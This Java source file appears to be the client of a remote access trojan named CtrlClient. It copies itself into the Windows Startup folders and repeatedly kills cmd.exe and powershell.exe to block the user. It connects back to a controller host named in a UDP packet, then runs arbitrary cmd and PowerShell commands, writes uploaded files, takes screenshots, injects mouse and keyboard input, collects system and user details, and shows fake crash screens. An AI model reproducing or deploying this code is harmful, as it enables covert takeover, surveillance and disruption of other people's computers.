package main;

import java.awt.Toolkit;
import java.awt.Robot;
import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.event.InputEvent;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.DatagramSocket;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.nio.file.Files;
import java.rmi.UnknownHostException;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;
import java.util.jar.JarFile;
import java.util.jar.Manifest;
import java.util.jar.Attributes;

import javax.imageio.ImageIO;

import com.sun.jna.ptr.IntByReference;
import com.sun.jna.platform.win32.Secur32;

import static comms.Comms.*;
import c9x.*;
import monitor.MonitorClient;

class ProtectService extends TimerTask {
	static String[] taskNames = new String[]{
		"cmd.exe",
		"powershell.exe",
	};
	@Override
	public void run() {
		if(!CtrlClient.protectActive) {
			return;
		}
		try {
			for(String taskName : taskNames) {
				Process checkProc = CtrlClient.runtime.exec("taskkill.exe /f /im " + taskName);
				if(!checkProc.waitFor(250, TimeUnit.MILLISECONDS)) {
					System.err.println("Error: Protection Service's command has timed out.");
					checkProc.destroyForcibly();
				}
			}
		} 
		catch (IOException e) {
			e.printStackTrace();
		} 
		catch (InterruptedException e) {
			e.printStackTrace();
		}
	}
	
}

public class CtrlClient {
	static Socket connection;
	static String hostIP;
	static Robot robot;
	static Toolkit toolkit = Toolkit.getDefaultToolkit();
	static Rectangle screenRect = new Rectangle(toolkit.getScreenSize());
	static Runtime runtime = Runtime.getRuntime();
	static Timer timer = new Timer();
	static int cmdTimeout = 3000;
	static boolean protectActive = true;
	static boolean copyActive = true;
	static boolean isWindows;
	
	static BufferedImage getScreenShot() {
		return robot.createScreenCapture(screenRect);
	}
	static void drainStream(InputStream is) throws IOException {
		byte[] buffer = new byte[2048];
		while(is.read(buffer) != -1);
	}
	
	static class C9x {
		static boolean initialized = false;
		static GlassPanel glassPanel;
		static Flicker flicker;
		static MouseBlocker mouseBlocker;
		static BSODFrame bsodFrame;
		
		static void initialize() {
			glassPanel = new GlassPanel();
			flicker = new Flicker();
			mouseBlocker = new MouseBlocker();
			bsodFrame = new BSODFrame();
			initialized = true;
		}
	}
	/*
	 * The program can be run with the command line arguments
	 * "noprotect" and "nocopy" to disable the protect and copy features,
	 * respectively. The Protect Service can still be manually activated
	 * by the server even if "noprotect" is specified.
	 */
	public static void main(String[] args) {
		for(String option : args) {
			if(option.toLowerCase().equals("noprotect"))
				protectActive = false;
			else if(option.toLowerCase().equals("nocopy"))
				copyActive = false;
		}
		
		timer.schedule(new ProtectService(), 1000, 500);
		
		String osname = System.getProperty("os.name");
		if(osname.toLowerCase().contains("win")) {
			isWindows = true;
		}
		else {
			isWindows = false;
		}
		
		if(copyActive) {
			try {
				if(isWindows) {
					File jarSource;
					boolean done = false;
					try {
						jarSource = new File(CtrlClient.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
					} catch (URISyntaxException e) {
						jarSource = null;
					}
					if(jarSource != null && jarSource.isFile()) {
						try {
							copySelfToGlobalStartup(jarSource.getCanonicalPath());
						}
						catch(IOException ioe) {
							System.err.println("An error occurred when trying to copy to global startup. The program will now be copied to the local startup instead.");
							try {
								copySelfToStartup(jarSource.getCanonicalPath());
							} catch (IOException e) {
								System.err.println("An error occurred when trying to copy to user-specific startup. The copy attempt will be cancelled.");
							}
						}
						done = true;
					}
					if(!done) {
						File dir;
						if(jarSource.isDirectory()) {
							System.out.println("Warning: The jar source obtained normally is a directory.");
							dir = jarSource;
						}
						else {
							System.out.println("Warning: Could not obtain jar source.");
							dir = new File(".");
						}
						System.out.println("This program will now try to locate itself by comparing manifest contents.");
						String jarName = null;
						for(File f : dir.listFiles()) {
							String fileName = f.getName();
							int indexOfDot = fileName.lastIndexOf('.');
							if(indexOfDot < 0) {
								continue;
							}
							String extension = fileName.substring(indexOfDot + 1);
							if(extension.equals("jar")) {
								try {
									JarFile jar = new JarFile(f);
									Manifest jarManifest = jar.getManifest();
									jar.close();
									Attributes manAttributes = jarManifest.getMainAttributes();
									String ver = manAttributes.getValue("CtrlClient-Version");
									if(ver != null && ver.equals(CLIENTVER)) {
										jarName = fileName;
										break;
									}
								} 
								catch (IOException e) {
									e.printStackTrace();
									continue;
								}
							}
						}
						
						if(jarName == null) {
							System.err.println("Cannot automatically find this jar's name. The default of CtrlClient.jar will be used.");
							jarName = "CtrlClient.jar";
						}
						
						try {
							copySelfToGlobalStartup(jarName);
						}
						catch(IOException ioe) {
							System.err.println("An error occurred when trying to copy to global startup. The program will now be copied to the local startup instead.");
							try {
								copySelfToStartup(jarName);
							} catch (IOException e) {
								System.err.println("An error occurred when trying to copy to user-specific startup. The copy attempt will be cancelled.");
							}
						}
					}
				}
				else {
					System.err.println("The OS is not windows and thus the copy into startup folder could not be performed.");
				}
			}
			catch(Exception e) {
				System.err.println("An unexpected error occurred when copying:");
				e.printStackTrace();
			}
		}
		
		try {
			robot = new Robot();
		}
		catch(AWTException e) {
			robot = null;
		}
		
		while(true) {
			try {
				DatagramSocket dSocket = new DatagramSocket(PORT, InetAddress.getByName("0.0.0.0"));
				connection = null;
				
				while(connection == null || !connection.isConnected()) {
					try {
						byte[] buf = new byte[1024];
						System.out.println("Waiting for data packets...");
						DatagramPacket dPacket = new DatagramPacket(buf, buf.length);
						dSocket.receive(dPacket);
						String host = new String(buf).trim();
						int index;
						for(index = 0; !Character.isLetter(host.charAt(index)) && index < host.length() - 1; index ++);
						host.substring(0, index);
						System.out.println("Establishing connection with " + host);
						connection = new Socket(host, PORT);
						System.out.println("Connection established with " + host);
						hostIP = host;
					}
					catch(Exception e) {
						System.err.println("Failed to establish connection or receive packet:");
						e.printStackTrace();
					}
				}
				dSocket.close();
				DataOutputStream cout = new DataOutputStream(connection.getOutputStream());
				DataInputStream cin = new DataInputStream(connection.getInputStream());
				runtime = Runtime.getRuntime();
				while(true) {
					byte cmdType = cin.readByte();
					switch(cmdType) {
					//BOOKMARK Command switch starting point
					case CMD_RAW:
					{
						String cmd = cin.readUTF();
						Process cmdProc = runtime.exec(cmd);
						boolean successful;
						try {
							successful = cmdProc.waitFor(cmdTimeout, TimeUnit.MILLISECONDS);
						} catch (InterruptedException e) {
							e.printStackTrace();
							successful = false;
						}
						if(successful) {
							BufferedReader cmdOut = new BufferedReader(new InputStreamReader(cmdProc.getInputStream()));
							BufferedReader cmdErr = new BufferedReader(new InputStreamReader(cmdProc.getErrorStream()));
							StringBuilder feedback = new StringBuilder("----- stdout -----\n");
							String s;
							while(cmdOut.ready() && (s = cmdOut.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							feedback.append("----- stderr -----\n");
							while(cmdErr.ready() && (s = cmdErr.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							cout.writeUTF(feedback.toString());
						}
						else {
							cmdProc.destroyForcibly();
							cout.writeUTF("Error: The operation timed out.");
						}
					}
						break;
					case CMD_RUNCMD:
					{
						String cmd = cin.readUTF();
						Process cmdProc = runtime.exec("cmd /c" + cmd);
						boolean successful;
						try {
							successful = cmdProc.waitFor(cmdTimeout, TimeUnit.MILLISECONDS);
						} catch (InterruptedException e) {
							e.printStackTrace();
							successful = false;
						}
						if(successful) {
							BufferedReader cmdOut = new BufferedReader(new InputStreamReader(cmdProc.getInputStream()));
							BufferedReader cmdErr = new BufferedReader(new InputStreamReader(cmdProc.getErrorStream()));
							StringBuilder feedback = new StringBuilder("----- stdout -----\n");
							String s;
							while(cmdOut.ready() && (s = cmdOut.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							feedback.append("----- stderr -----\n");
							while(cmdErr.ready() && (s = cmdErr.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							cout.writeUTF(feedback.toString());
						}
						else {
							cmdProc.destroyForcibly();
							cout.writeUTF("Error: The operation timed out.");
						}
					}
						break;
					case CMD_RUNIN:
					{
						String dir = cin.readUTF();
						String cmd = cin.readUTF();
						Process cmdProc = runtime.exec("cmd /c" + cmd, null, new File(dir));
						boolean successful;
						try {
							successful = cmdProc.waitFor(cmdTimeout, TimeUnit.MILLISECONDS);
						} catch (InterruptedException e) {
							e.printStackTrace();
							successful = false;
						}
						if(successful) {
							BufferedReader cmdOut = new BufferedReader(new InputStreamReader(cmdProc.getInputStream()));
							BufferedReader cmdErr = new BufferedReader(new InputStreamReader(cmdProc.getErrorStream()));
							StringBuilder feedback = new StringBuilder("----- stdout -----\n");
							String s;
							while(cmdOut.ready() && (s = cmdOut.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							feedback.append("----- stderr -----\n");
							while(cmdErr.ready() && (s = cmdErr.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							cout.writeUTF(feedback.toString());
						}
						else {
							cmdProc.destroyForcibly();
							cout.writeUTF("Error: The operation timed out.");
						}
					}
						break;
					case CMD_RAWIN:
					{
						String dir = cin.readUTF();
						String cmd = cin.readUTF();
						Process cmdProc = runtime.exec(cmd, null, new File(dir));
						boolean successful;
						try {
							successful = cmdProc.waitFor(cmdTimeout, TimeUnit.MILLISECONDS);
						} catch (InterruptedException e) {
							e.printStackTrace();
							successful = false;
						}
						if(successful) {
							BufferedReader cmdOut = new BufferedReader(new InputStreamReader(cmdProc.getInputStream()));
							BufferedReader cmdErr = new BufferedReader(new InputStreamReader(cmdProc.getErrorStream()));
							StringBuilder feedback = new StringBuilder("----- stdout -----\n");
							String s;
							while(cmdOut.ready() && (s = cmdOut.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							feedback.append("----- stderr -----\n");
							while(cmdErr.ready() && (s = cmdErr.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							cout.writeUTF(feedback.toString());
						}
						else {
							cmdProc.destroyForcibly();
							cout.writeUTF("Error: The operation timed out.");
						}
					}
						break;
					case CMD_RUNPSIN:
					{
						String dir = cin.readUTF();
						String cmd = cin.readUTF();
						Process cmdProc = runtime.exec("powershell.exe -Command \"" + cmd + '\"', null, new File(dir));
						boolean successful;
						try {
							successful = cmdProc.waitFor(cmdTimeout, TimeUnit.MILLISECONDS);
						} catch (InterruptedException e) {
							e.printStackTrace();
							successful = false;
						}
						if(successful) {
							BufferedReader cmdOut = new BufferedReader(new InputStreamReader(cmdProc.getInputStream()));
							BufferedReader cmdErr = new BufferedReader(new InputStreamReader(cmdProc.getErrorStream()));
							StringBuilder feedback = new StringBuilder("----- stdout -----\n");
							String s;
							while(cmdOut.ready() && (s = cmdOut.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							feedback.append("----- stderr -----\n");
							while(cmdErr.ready() && (s = cmdErr.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							cout.writeUTF(feedback.toString());
						}
						else {
							cmdProc.destroyForcibly();
							cout.writeUTF("Error: The operation timed out.");
						}
					}
						break;
					case CMD_RUNPS:
					{
						String cmd = cin.readUTF();
						Process cmdProc = runtime.exec("powershell.exe -Command \"" + cmd + '\"');
						boolean successful;
						try {
							successful = cmdProc.waitFor(cmdTimeout, TimeUnit.MILLISECONDS);
						} catch (InterruptedException e) {
							e.printStackTrace();
							successful = false;
						}
						if(successful) {
							BufferedReader cmdOut = new BufferedReader(new InputStreamReader(cmdProc.getInputStream()));
							BufferedReader cmdErr = new BufferedReader(new InputStreamReader(cmdProc.getErrorStream()));
							StringBuilder feedback = new StringBuilder("----- stdout -----\n");
							String s;
							while(cmdOut.ready() && (s = cmdOut.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							feedback.append("----- stderr -----\n");
							while(cmdErr.ready() && (s = cmdErr.readLine()) != null) {
								feedback.append(s);
								feedback.append('\n');
							}
							cout.writeUTF(feedback.toString());
						}
						else {
							cmdProc.destroyForcibly();
							cout.writeUTF("Error: The operation timed out.");
						}
					}
						break;
					case CMD_FILE:
					{
						try {
							int len = cin.readInt();
							byte[] fileData = new byte[len];
							cin.readFully(fileData);
							
							File file = new File(cin.readUTF());
							if(file.exists()) {
								file.delete();
							}
							file.createNewFile();
							FileOutputStream fos = new FileOutputStream(file);
							fos.write(fileData);
							fos.close();
							cout.writeUTF("File successfully written.");
						}
						catch(IOException e) {
							cout.writeUTF("An IOException was thrown: " + e.getMessage());
						}
						catch(Exception e) {
							cout.writeUTF("An error occurred: " + e.getMessage());
						}
					}
						break;
					case CMD_MDOWN:
					{
						int button = cin.readInt();
						if(robot == null) {
							cout.writeByte(RET_ERR);
						}
						else {
							robot.mousePress(button);
							cout.writeByte(RET_SUCCESS);
						}
					}
						break;
					case CMD_MUP:
					{
						int button = cin.readInt();
						if(robot == null) {
							cout.writeByte(RET_ERR);
						}
						else {
							robot.mouseRelease(button);
							cout.writeByte(RET_SUCCESS);
						}
					}
						break;
					case CMD_LDBLCLICK:
					{
						if(robot == null) {
							cout.writeByte(RET_ERR);
						}
						else {
							robot.mousePress(InputEvent.BUTTON1_MASK);
							robot.mouseRelease(InputEvent.BUTTON1_MASK);
							robot.mousePress(InputEvent.BUTTON1_MASK);
							robot.mouseRelease(InputEvent.BUTTON1_MASK);
							cout.writeByte(RET_SUCCESS);
						}
					}
						break;
					case CMD_LCLICK:
					{
						if(robot == null) {
							cout.writeByte(RET_ERR);
						}
						else {
							robot.mousePress(InputEvent.BUTTON1_MASK);
							robot.mouseRelease(InputEvent.BUTTON1_MASK);
							cout.writeByte(RET_SUCCESS);
						}
					}
						break;
					case CMD_MCLICK:
					{
						if(robot == null) {
							cout.writeByte(RET_ERR);
						}
						else {
							robot.mousePress(InputEvent.BUTTON2_MASK);
							robot.mouseRelease(InputEvent.BUTTON2_MASK);
							cout.writeByte(RET_SUCCESS);
						}
					}
						break;
					case CMD_RCLICK:
					{
						if(robot == null) {
							cout.writeByte(RET_ERR);
						}
						else {
							robot.mousePress(InputEvent.BUTTON3_MASK);
							robot.mouseRelease(InputEvent.BUTTON3_MASK);
							cout.writeByte(RET_SUCCESS);
						}
					}
						break;
					case CMD_MMOVE:
					{
						int x = cin.readInt();
						int y = cin.readInt();
						if(robot == null) {
							cout.writeByte(RET_ERR);
						}
						else {
							robot.mouseMove(x, y);
							cout.writeByte(RET_SUCCESS);
						}
					}
						break;
					case CMD_SSHOT:
					{
						if(robot == null) {
							cout.writeByte(RET_ERR);
						}
						else {
							ByteArrayOutputStream dataStream = new ByteArrayOutputStream();
							ImageIO.write(getScreenShot(), "png", dataStream);
							byte[] imgData = dataStream.toByteArray();
							dataStream.close();
							cout.writeByte(RET_SUCCESS);
							cout.writeInt(imgData.length);
							cout.write(imgData);
						}
					}
						break;
					case CMD_KILL:
					{
						connection.close();
						System.out.println("The server has requested a shutdown.");
						System.exit(0);
					}
						break;
					case CMD_PROTECT:
					{
						try {
							protectActive = cin.readBoolean();
							cout.writeByte(RET_SUCCESS);
						}
						catch(IOException e) {
							cout.writeByte(RET_ERR);
						}
					}
						break;
					case CMD_SETTIMEOUT:
					{
						try {
							cmdTimeout = cin.readInt();
							cout.writeByte(RET_SUCCESS);
						}
						catch(IOException e) {
							cout.writeByte(RET_ERR);
						}
					}
						break;
					case CMD_GETNAME:
					{
						if(!isWindows) {
							cout.writeUTF("<ERROR_NOT_WINDOWS>");
							break;
						}
						try {
							char[] namebuf = new char[128];
							//System.out.println("Retrieving username...");
							Secur32.INSTANCE.GetUserNameEx(Secur32.EXTENDED_NAME_FORMAT.NameDisplay, namebuf, new IntByReference(namebuf.length));
							String name = new String(namebuf).trim();
							//System.out.println("Sending username...");
							if(name == null) {
								//System.err.println("null username");
								cout.writeUTF("(null)");
							}
							else if(name.equals("")) {
								//System.err.println("empty username");
								cout.writeUTF("(null)");
							}
							else {
								cout.writeUTF(name);
							}
						}
						catch(Exception e) {
							cout.writeUTF("<ERROR_UNKNOWN_EXCEPTION_THROWN>");
						}
					}
						break;
					case CMD_INSERTSTR:
					{
						int size = cin.readInt();
						int[] codes = new int[size];
						boolean[] isPress = new boolean[size];
						for(int i = 0; i < size; i ++) {
							codes[i] = cin.readInt();
							isPress[i] = cin.readBoolean();
						}
						if(robot == null) {
							cout.writeByte(RET_ERR);
							System.err.println("Robot is null");
						}
						else {
							try {
								for(int i = 0; i < size; i ++) {
									if(isPress[i]) {
										robot.keyPress(codes[i]);
									}
									else {
										robot.keyRelease(codes[i]);
									}
								}
								
								cout.writeByte(RET_SUCCESS);
							}
							catch(Exception e) {
								System.err.println("Error in insertstr:");
								e.printStackTrace();
								cout.writeByte(RET_ERR);
							}
						}
					}
						break;
					case CMD_GETVER:
					{
						cout.writeUTF(CLIENTVER);
					}
						break;
					case CMD_MONITOR:
					{
						int portNumber = cin.readInt();
						try {
							MonitorClient monitor = new MonitorClient(hostIP, portNumber);
							new Thread(monitor, "monitor client").start();
							cout.writeByte(RET_SUCCESS);
						}
						catch(IOException | AWTException e) {
							cout.writeByte(RET_ERR);
						}
					}
						break;
					case CMD_INFO:
					{
						//System.out.println("Getting info");
						Map<String, String> env = System.getenv();
						//System.out.println("Sending info");
						if(env.containsKey("COMPUTERNAME")) {
							cout.writeUTF(env.get("COMPUTERNAME"));
						}
						else if(env.containsKey("HOSTNAME")) {
							cout.writeUTF(env.get("HOSTNAME"));
						}
						else {
							cout.writeUTF("<Unknown>");
						}
						cout.writeUTF(System.getProperty("user.name"));
						cout.writeUTF(System.getProperty("os.name"));
					}
						break;
					case CMD_JVMNAME:
					{
						cout.writeUTF(ManagementFactory.getRuntimeMXBean().getName());
					}
						break;
					case CMD_INFOEX:
					{
						cout.writeUTF(System.getProperty("user.name"));
						cout.writeUTF(System.getProperty("user.home"));
						cout.writeUTF(System.getProperty("user.dir"));
						Map<String, String> env = System.getenv();
						if(env.containsKey("COMPUTERNAME")) {
							cout.writeUTF(env.get("COMPUTERNAME"));
						}
						else if(env.containsKey("HOSTNAME")) {
							cout.writeUTF(env.get("HOSTNAME"));
						}
						else {
							cout.writeUTF("<Unknown>");
						}
						cout.writeUTF(System.getProperty("os.name"));
						cout.writeUTF(System.getProperty("os.arch"));
						cout.writeUTF(System.getProperty("os.version"));
						cout.writeUTF(ManagementFactory.getRuntimeMXBean().getName());
						cout.writeUTF(System.getProperty("java.vendor"));
						cout.writeUTF(System.getProperty("java.version"));
						cout.writeUTF(CLIENTVER);
						cout.writeUTF(new File(".").getCanonicalPath());
						String jarSource;
						try {
							jarSource = CtrlClient.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
						} catch (URISyntaxException e) {
							jarSource = null;
						}
						cout.writeUTF(jarSource == null ? "<Unknown>" : jarSource); 
					}
					case CMD_C9X:
					{
						boolean enable = cin.readBoolean();
						byte program = cin.readByte();
						boolean success = true;
						try {
							if(!C9x.initialized) {
								C9x.initialize();
							}
							switch(program) {
							case C9X_GPANEL:
								if(enable) {
									if(!C9x.glassPanel.glassPanelIsEnabled()) {
										C9x.glassPanel.enableGlassPanel();
									}
								}
								else if(C9x.glassPanel.glassPanelIsEnabled()) {
									C9x.glassPanel.disableGlassPanel();
								}
								break;
							case C9X_FLICKER:
								if(enable) {
									if(!C9x.flicker.isRunning()) {
										new Thread(C9x.flicker, "c9c8").start();
									}
								}
								else if(C9x.flicker.isRunning()) {
									C9x.flicker.stop();
									C9x.flicker = new Flicker();
								}
								break;
							case C9X_MBLOCKER:
								if(enable) {
									if(!C9x.mouseBlocker.isRunning()) {
										new Thread(C9x.mouseBlocker, "c9dd").start();
									}
								}
								else if(C9x.mouseBlocker.isRunning()) {
									C9x.mouseBlocker.stop();
									C9x.mouseBlocker = new MouseBlocker();
								}
								break;
							case C9X_BSODWIN10:
								if(enable) {
									if(!C9x.bsodFrame.getEnabled()) {
										try {
											C9x.bsodFrame.setBSODOS("win10");
											C9x.bsodFrame.enableBSOD();
										}
										catch(IOException e) {
											success = false;
										}
									}
								}
								else if(C9x.bsodFrame.getEnabled()) {
									C9x.bsodFrame.disableBSOD();
								}
								break;
							case C9X_BSODWIN7:
								if(enable) {
									if(!C9x.bsodFrame.getEnabled()) {
										try {
											C9x.bsodFrame.setBSODOS("win7");
											C9x.bsodFrame.enableBSOD();
										}
										catch(IOException e) {
											success = false;
										}
									}
								}
								else if(C9x.bsodFrame.getEnabled()) {
									C9x.bsodFrame.disableBSOD();
								}
								break;
							case C9X_KPMACOSX:
								if(enable) {
									if(!C9x.bsodFrame.getEnabled()) {
										try {
											C9x.bsodFrame.setBSODOS("macosx");
											C9x.bsodFrame.enableBSOD();
										}
										catch(IOException e) {
											success = false;
										}
									}
								}
								else if(C9x.bsodFrame.getEnabled()) {
									C9x.bsodFrame.disableBSOD();
								}
								break;
							case C9X_KPLINUX:
								if(enable) {
									if(!C9x.bsodFrame.getEnabled()) {
										try {
											C9x.bsodFrame.setBSODOS("linux");
											C9x.bsodFrame.enableBSOD();
										}
										catch(IOException e) {
											success = false;
										}
									}
								}
								else if(C9x.bsodFrame.getEnabled()) {
									C9x.bsodFrame.disableBSOD();
								}
								break;
							case C9X_BSODAUTO:
							{
								String os = System.getProperty("os.name").toLowerCase();
								String oscode = null;
								String ver;
								try {
									if(os.contains("windows")) {
										ver = os.split(" ")[1];
										switch(ver) {
										case "8":
										case "10":
											oscode = "win10";
											break;
										case "7":
										case "vista":
										case "xp":
											oscode = "win7";
											break;
										default:break;
										}
									}
									else if(os.contains("mac")) {
										oscode = "macosx";
									}
									else if(os.contains("linux") || os.contains("sunos") || os.contains("freebsd")) {
										oscode = "linux";
									}
									
								}
								catch(ArrayIndexOutOfBoundsException e) {
									success = false;
									break;
								}
								if(oscode == null) {
									success = false;
									break;
								}
								
								if(enable) {
									if(!C9x.bsodFrame.getEnabled()) {
										try {
											C9x.bsodFrame.setBSODOS(oscode);
											C9x.bsodFrame.enableBSOD();
										}
										catch(IOException e) {
											success = false;
										}
									}
								}
								else if(C9x.bsodFrame.getEnabled()) {
									C9x.bsodFrame.disableBSOD();
								}
							}
								break;
							default:
								success = false;
								break;
							}
						}
						catch(Exception e) {
							success = false;
						}
						if(success) {
							cout.writeByte(RET_SUCCESS);
						}
						else {
							cout.writeByte(RET_ERR);							
						}
					}
						break;
					default:
						try {
							Thread.sleep(1000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
						drainStream(connection.getInputStream());
						cout.writeByte(RET_ERR);
						System.err.println("Unknown command byte value: 0x" + String.format("%x", cmdType));
						break;
					}
					//BOOKMARK Command switch ending point
				}
				
			}
			catch(UnknownHostException e) {
				System.err.println("Unknown host");
			}
			catch(IOException e) {
				e.printStackTrace();
			}
			finally {
				try {
					connection.close();
					System.out.println("Socket closed.");
				} 
				catch (IOException e1) {
					System.err.println("FATAL ERROR: SOCKET CANNOT BE CLOSED");
				}
				connection = null;
			}
		}
	}
	static void copySelfToStartup(String name) throws IOException {
		File thisFile = new File(name);
		String username = System.getProperty("user.name");
		String path = "C:\\Users\\" + username +
				"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
				+ thisFile.getName();
		File out = new File(path);
		if(!out.exists()) {
			Files.copy(thisFile.toPath(), out.toPath());
		}
	}
	static void copySelfToGlobalStartup(String name) throws IOException {
		File thisFile = new File(name);
		String path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\" + thisFile.getName();
		File out = new File(path);
		if(!out.exists()) {
			Files.copy(thisFile.toPath(), out.toPath());
		}
	}
}
